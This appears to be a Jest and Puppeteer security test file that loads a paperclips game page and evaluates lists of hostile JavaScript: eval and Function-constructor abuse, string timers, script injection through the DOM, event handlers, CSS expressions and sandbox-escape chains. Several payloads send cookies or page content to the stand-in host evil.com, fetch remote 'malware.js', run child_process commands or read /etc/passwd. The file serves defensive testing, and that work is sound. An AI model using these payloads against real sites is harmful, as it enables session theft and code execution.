import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
import puppeteer, { Browser, Page } from 'puppeteer';

describe('Unsafe JavaScript Execution Security Tests', () => {
  let browser: Browser;
  let page: Page;

  beforeAll(async () => {
    browser = await puppeteer.launch({ 
      headless: true,
      args: ['--disable-features=IsolateOrigins,site-per-process'] // For testing cross-origin scenarios
    });
    page = await browser.newPage();
  });

  afterAll(async () => {
    await browser.close();
  });

  describe('Unsafe JavaScript Execution Prevention', () => {
    it('should prevent eval() abuse', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const evalTests = [
        // Direct eval attempts
        'alert(1)',
        'document.cookie',
        'window.location="http://evil.com"',
        'fetch("http://evil.com/steal?data=" + document.cookie)',
        'require("child_process").exec("whoami")',
        'process.exit()',
        'import("fs").then(m => m.readFileSync("/etc/passwd"))',
        
        // Obfuscated eval
        'alert\u0028\u0031\u0029',
        'alert\\u0028\\u0031\\u0029',
        '\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29',
        'String.fromCharCode(97,108,101,114,116,40,49,41)',
        'atob("YWxlcnQoMSk=")',
        'unescape("%61%6c%65%72%74%28%31%29")',
        
        // Indirect eval
        '(1, eval)("alert(1)")',
        'window.eval("alert(1)")',
        'window["eval"]("alert(1)")',
        'this.eval("alert(1)")',
        'global.eval("alert(1)")',
        'globalThis.eval("alert(1)")',
        
        // eval alternatives
        'Function("alert(1)")()',
        'new Function("alert(1)")()',
        'setTimeout("alert(1)", 0)',
        'setInterval("alert(1)", 1000)',
        'setImmediate("alert(1)")',
        
        // Complex payloads
        'for(let i=0;i<1e6;i++){console.log(i)}',
        'while(true){}',
        'function recurse(){recurse()}recurse()',
        '[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])()'
      ];

      for (const code of evalTests) {
        const result = await page.evaluate((evalCode) => {
          try {
            // Check if eval is disabled or restricted
            const result = eval(evalCode);
            return { executed: true, result: String(result) };
          } catch (e: any) {
            return { executed: false, error: e.message };
          }
        }, code);

        // eval should be restricted or monitored
        if (result.executed) {
          // Check that dangerous operations didn't succeed
          const alertFired = await new Promise(resolve => {
            page.once('dialog', () => resolve(true));
            setTimeout(() => resolve(false), 100);
          });
          expect(alertFired).toBe(false);

          // Check page state wasn't compromised
          const url = await page.url();
          expect(url).toContain('williamzujkowski.github.io');
        }
      }
    });

    it('should prevent Function constructor abuse', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const functionConstructorTests = [
        // Basic Function constructor
        ['return alert(1)'],
        ['return window.location.href = "http://evil.com"'],
        ['return document.cookie'],
        ['return fetch("http://evil.com/steal?data=" + document.body.innerHTML)'],
        
        // Multiple arguments
        ['a', 'b', 'return a + b + alert(1)'],
        ['x', 'return eval(x)'],
        
        // Complex bodies
        ['return require("child_process").exec("id")'],
        ['return process.mainModule.require("fs").readFileSync("/etc/passwd")'],
        ['return import("fs").then(m => m.readFileSync("/etc/passwd"))'],
        
        // Async functions
        ['return (async () => { await fetch("http://evil.com"); })()'],
        
        // Generator functions
        ['return (function* () { yield alert(1); })().next()'],
        
        // Arrow functions via parsing
        ['return (() => alert(1))()'],
        
        // With statements
        ['with(document) { write("<script>alert(1)</script>") }'],
        
        // Proxy manipulation
        ['return new Proxy({}, { get: () => alert(1) })']
      ];

      for (const args of functionConstructorTests) {
        const result = await page.evaluate((fnArgs) => {
          try {
            const fn = new Function(...fnArgs);
            const result = fn();
            return { executed: true, result: String(result) };
          } catch (e: any) {
            return { executed: false, error: e.message };
          }
        }, args);

        // Function constructor should be restricted
        if (result.executed) {
          // Check that dangerous operations didn't succeed
          const alertFired = await new Promise(resolve => {
            page.once('dialog', () => resolve(true));
            setTimeout(() => resolve(false), 100);
          });
          expect(alertFired).toBe(false);

          // Verify no data exfiltration
          const requests = await page.evaluate(() => {
            return performance.getEntriesByType('resource')
              .map(r => r.name)
              .filter(url => url.includes('evil.com'));
          });
          expect(requests.length).toBe(0);
        }
      }
    });

    it('should prevent setTimeout/setInterval string execution', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const timerStringTests = [
        // setTimeout with strings
        { method: 'setTimeout', code: 'alert(1)', delay: 0 },
        { method: 'setTimeout', code: 'document.cookie="hacked=true"', delay: 0 },
        { method: 'setTimeout', code: 'window.location="http://evil.com"', delay: 0 },
        
        // setInterval with strings
        { method: 'setInterval', code: 'alert(1)', delay: 1000 },
        { method: 'setInterval', code: 'console.log(document.cookie)', delay: 1000 },
        
        // Complex timer code
        { method: 'setTimeout', code: 'fetch("http://evil.com/data").then(r=>r.text())', delay: 0 },
        { method: 'setTimeout', code: 'import("http://evil.com/malware.js")', delay: 0 },
        
        // Nested timers
        { method: 'setTimeout', code: 'setTimeout("alert(1)", 0)', delay: 0 },
        
        // Obfuscated strings
        { method: 'setTimeout', code: String.fromCharCode(97,108,101,114,116,40,49,41), delay: 0 },
        { method: 'setTimeout', code: atob('YWxlcnQoMSk='), delay: 0 }
      ];

      for (const test of timerStringTests) {
        const result = await page.evaluate(({ method, code, delay }) => {
          try {
            let timerId;
            if (method === 'setTimeout') {
              timerId = window.setTimeout(code as any, delay);
              clearTimeout(timerId);
            } else {
              timerId = window.setInterval(code as any, delay);
              clearInterval(timerId);
            }
            return { executed: true, timerId };
          } catch (e: any) {
            return { executed: false, error: e.message };
          }
        }, test);

        // String execution in timers should be prevented or safe
        if (result.executed) {
          await page.waitForTimeout(100);
          
          // Check no alerts fired
          const alertFired = await new Promise(resolve => {
            page.once('dialog', () => resolve(true));
            setTimeout(() => resolve(false), 100);
          });
          expect(alertFired).toBe(false);

          // Check no navigation occurred
          const url = await page.url();
          expect(url).toContain('williamzujkowski.github.io');
        }
      }
    });

    it('should prevent script injection through DOM manipulation', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const domScriptInjectionTests = [
        // innerHTML script injection
        async () => {
          const result = await page.evaluate(() => {
            const div = document.createElement('div');
            div.innerHTML = '<script>alert(1)</script>';
            document.body.appendChild(div);
            
            // Check if script executed
            return { 
              hasScript: div.querySelector('script') !== null,
              scriptContent: div.querySelector('script')?.textContent
            };
          });
          
          const alertFired = await new Promise(resolve => {
            page.once('dialog', () => resolve(true));
            setTimeout(() => resolve(false), 100);
          });
          expect(alertFired).toBe(false);
        },

        // document.write injection
        async () => {
          const result = await page.evaluate(() => {
            try {
              document.write('<script>alert(1)</script>');
              return { executed: true };
            } catch (e: any) {
              return { executed: false, error: e.message };
            }
          });
          
          if (result.executed) {
            const alertFired = await new Promise(resolve => {
              page.once('dialog', () => resolve(true));
              setTimeout(() => resolve(false), 100);
            });
            expect(alertFired).toBe(false);
          }
        },

        // insertAdjacentHTML injection
        async () => {
          const result = await page.evaluate(() => {
            const div = document.createElement('div');
            document.body.appendChild(div);
            div.insertAdjacentHTML('beforeend', '<script>alert(1)</script>');
            return { injected: true };
          });
          
          const alertFired = await new Promise(resolve => {
            page.once('dialog', () => resolve(true));
            setTimeout(() => resolve(false), 100);
          });
          expect(alertFired).toBe(false);
        },

        // outerHTML injection
        async () => {
          const result = await page.evaluate(() => {
            const div = document.createElement('div');
            document.body.appendChild(div);
            div.outerHTML = '<script>alert(1)</script>';
            return { replaced: true };
          });
          
          const alertFired = await new Promise(resolve => {
            page.once('dialog', () => resolve(true));
            setTimeout(() => resolve(false), 100);
          });
          expect(alertFired).toBe(false);
        }
      ];

      for (const test of domScriptInjectionTests) {
        await test();
      }
    });

    it('should prevent dynamic import abuse', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const dynamicImportTests = [
        // Remote script imports
        'http://evil.com/malware.js',
        'https://evil.com/exploit.js',
        '//evil.com/backdoor.js',
        'data:text/javascript,alert(1)',
        'javascript:alert(1)',
        
        // Local file access attempts
        'file:///etc/passwd',
        'file://c:/windows/system32/drivers/etc/hosts',
        
        // Relative path traversal
        '../../../secret.js',
        '../../../../etc/passwd',
        
        // Blob URLs
        'blob:http://evil.com/12345',
        
        // Module attempts
        'fs',
        'child_process',
        'os',
        'path',
        'crypto',
        'net',
        'http',
        'https'
      ];

      for (const module of dynamicImportTests) {
        const result = await page.evaluate(async (mod) => {
          try {
            const imported = await import(mod);
            return { success: true, module: mod };
          } catch (e: any) {
            return { success: false, error: e.message };
          }
        }, module);

        // Dynamic imports should be restricted
        expect(result.success).toBe(false);
        
        // Verify no external resources were loaded
        const resources = await page.evaluate(() => {
          return performance.getEntriesByType('resource')
            .map(r => r.name)
            .filter(url => url.includes('evil.com'));
        });
        expect(resources.length).toBe(0);
      }
    });

    it('should prevent WebAssembly abuse', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const wasmTests = [
        // Basic WebAssembly instantiation
        async () => {
          const result = await page.evaluate(async () => {
            try {
              // Simple WASM module that could be malicious
              const wasmCode = new Uint8Array([
                0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00
              ]);
              
              const module = await WebAssembly.compile(wasmCode);
              const instance = await WebAssembly.instantiate(module);
              
              return { compiled: true };
            } catch (e: any) {
              return { compiled: false, error: e.message };
            }
          });

          // WebAssembly might be disabled or restricted
          if (result.compiled) {
            console.log('WebAssembly is enabled - ensure proper sandboxing');
          }
        },

        // WebAssembly streaming
        async () => {
          const result = await page.evaluate(async () => {
            try {
              const response = await fetch('data:application/wasm;base64,AGFzbQEAAAA=');
              const module = await WebAssembly.instantiateStreaming(response);
              return { streamed: true };
            } catch (e: any) {
              return { streamed: false, error: e.message };
            }
          });

          // Streaming compilation might be restricted
          if (result.streamed) {
            console.log('WebAssembly streaming is enabled - monitor for abuse');
          }
        }
      ];

      for (const test of wasmTests) {
        await test();
      }
    });

    it('should prevent code execution through event handlers', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const eventHandlerTests = [
        // Inline event handlers
        { tag: 'img', attrs: { src: 'x', onerror: 'alert(1)' } },
        { tag: 'body', attrs: { onload: 'alert(1)' } },
        { tag: 'input', attrs: { onfocus: 'alert(1)', autofocus: true } },
        { tag: 'svg', attrs: { onload: 'alert(1)' } },
        { tag: 'iframe', attrs: { onload: 'alert(1)' } },
        { tag: 'video', attrs: { onerror: 'alert(1)', src: 'x' } },
        { tag: 'audio', attrs: { onerror: 'alert(1)', src: 'x' } },
        { tag: 'details', attrs: { open: true, ontoggle: 'alert(1)' } },
        { tag: 'marquee', attrs: { onstart: 'alert(1)' } },
        
        // JavaScript protocol handlers
        { tag: 'a', attrs: { href: 'javascript:alert(1)' } },
        { tag: 'iframe', attrs: { src: 'javascript:alert(1)' } },
        { tag: 'form', attrs: { action: 'javascript:alert(1)' } },
        { tag: 'object', attrs: { data: 'javascript:alert(1)' } },
        { tag: 'embed', attrs: { src: 'javascript:alert(1)' } },
        
        // Data URL with script
        { tag: 'iframe', attrs: { src: 'data:text/html,<script>alert(1)</script>' } },
        { tag: 'object', attrs: { data: 'data:text/html,<script>alert(1)</script>' } }
      ];

      for (const test of eventHandlerTests) {
        await page.evaluate(({ tag, attrs }) => {
          const element = document.createElement(tag);
          Object.entries(attrs).forEach(([key, value]) => {
            element.setAttribute(key, String(value));
          });
          document.body.appendChild(element);
        }, test);

        // Check if event handler executed
        const alertFired = await new Promise(resolve => {
          page.once('dialog', () => resolve(true));
          setTimeout(() => resolve(false), 200);
        });

        expect(alertFired).toBe(false);

        // Clean up
        await page.evaluate((tag) => {
          const elements = document.querySelectorAll(tag);
          elements.forEach(el => el.remove());
        }, test.tag);
      }
    });

    it('should prevent execution through CSS expressions', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const cssExpressionTests = [
        // IE CSS expressions (legacy)
        'width: expression(alert(1))',
        'height: expression(document.cookie)',
        'background: expression(window.location="http://evil.com")',
        
        // JavaScript URLs in CSS
        'background: url("javascript:alert(1)")',
        'background-image: url("javascript:alert(document.cookie)")',
        'list-style-image: url("javascript:alert(1)")',
        'cursor: url("javascript:alert(1)"), auto',
        
        // CSS imports with JavaScript
        '@import "javascript:alert(1)";',
        '@import url("javascript:alert(1)");',
        
        // Behavior URLs (IE legacy)
        'behavior: url("javascript:alert(1)")',
        'behavior: url(#default#time2)',
        
        // XBL bindings (Firefox legacy)
        '-moz-binding: url("javascript:alert(1)")',
        'binding: url("javascript:alert(1)")'
      ];

      for (const cssCode of cssExpressionTests) {
        await page.evaluate((css) => {
          const style = document.createElement('style');
          style.textContent = `body { ${css} }`;
          document.head.appendChild(style);
        }, cssCode);

        // Check if CSS expression executed
        const alertFired = await new Promise(resolve => {
          page.once('dialog', () => resolve(true));
          setTimeout(() => resolve(false), 100);
        });

        expect(alertFired).toBe(false);

        // Clean up
        await page.evaluate(() => {
          const styles = document.querySelectorAll('style');
          styles.forEach(s => s.remove());
        });
      }
    });

    it('should prevent vm/sandbox escape attempts', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const sandboxEscapeTests = [
        // Constructor chain walking
        'this.constructor.constructor("return process")()',
        'arguments.callee.caller.constructor("return process")()',
        '[].constructor.constructor("return process")()',
        '({}).constructor.constructor("return process")()',
        'Error.constructor.constructor("return process")()',
        
        // Global object access
        'Function("return this")()',
        '(function(){return this})()',
        '(()=>this)()',
        'Reflect.get(Function("return this")(), "process")',
        
        // Prototype pollution for escape
        'Object.prototype.toString = function(){ return process }',
        'Array.prototype.join = function(){ return process }',
        
        // Symbol access
        'Object.getOwnPropertySymbols(global)',
        'Reflect.ownKeys(global)',
        
        // Error stack parsing
        'Error().stack',
        'new Error().stack',
        
        // AsyncFunction constructor
        '(async function(){}).constructor("return process")()',
        'Object.getPrototypeOf(async function(){}).constructor("return process")()',
        
        // GeneratorFunction constructor
        '(function*(){}).constructor("return process")()',
        'Object.getPrototypeOf(function*(){}).constructor("return process")()'
      ];

      for (const escapeCode of sandboxEscapeTests) {
        const result = await page.evaluate((code) => {
          try {
            const result = eval(code);
            return { 
              escaped: true, 
              hasProcess: typeof result === 'object' && 'exit' in result 
            };
          } catch (e: any) {
            return { escaped: false, error: e.message };
          }
        }, escapeCode);

        // Sandbox escape should be prevented
        expect(result.hasProcess).toBe(false);
      }
    });

    it('should implement Content Security Policy', async () => {
      const response = await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');
      
      // Check CSP headers
      const headers = response?.headers();
      const cspHeader = headers?.['content-security-policy'] || headers?.['Content-Security-Policy'];
      
      if (cspHeader) {
        // Verify unsafe-inline and unsafe-eval are not allowed
        expect(cspHeader).not.toContain("'unsafe-inline'");
        expect(cspHeader).not.toContain("'unsafe-eval'");
        
        // Check for script-src directive
        if (cspHeader.includes('script-src')) {
          expect(cspHeader).toMatch(/script-src\s+[^;]*('self'|'none')/);
        }
      } else {
        console.warn('No Content Security Policy header found - application may be vulnerable');
      }

      // Test CSP enforcement
      const cspViolations: string[] = [];
      
      page.on('console', (msg) => {
        if (msg.type() === 'error' && msg.text().includes('Content Security Policy')) {
          cspViolations.push(msg.text());
        }
      });

      // Try to violate CSP
      await page.evaluate(() => {
        try {
          // Inline script
          const script = document.createElement('script');
          script.textContent = 'console.log("inline script")';
          document.head.appendChild(script);
        } catch {}

        try {
          // eval
          eval('console.log("eval")');
        } catch {}

        try {
          // Remote script
          const script = document.createElement('script');
          script.src = 'https://evil.com/script.js';
          document.head.appendChild(script);
        } catch {}
      });

      await page.waitForTimeout(500);

      // Should have CSP violations if properly configured
      if (cspHeader && cspViolations.length > 0) {
        expect(cspViolations.length).toBeGreaterThan(0);
      }
    });
  });
});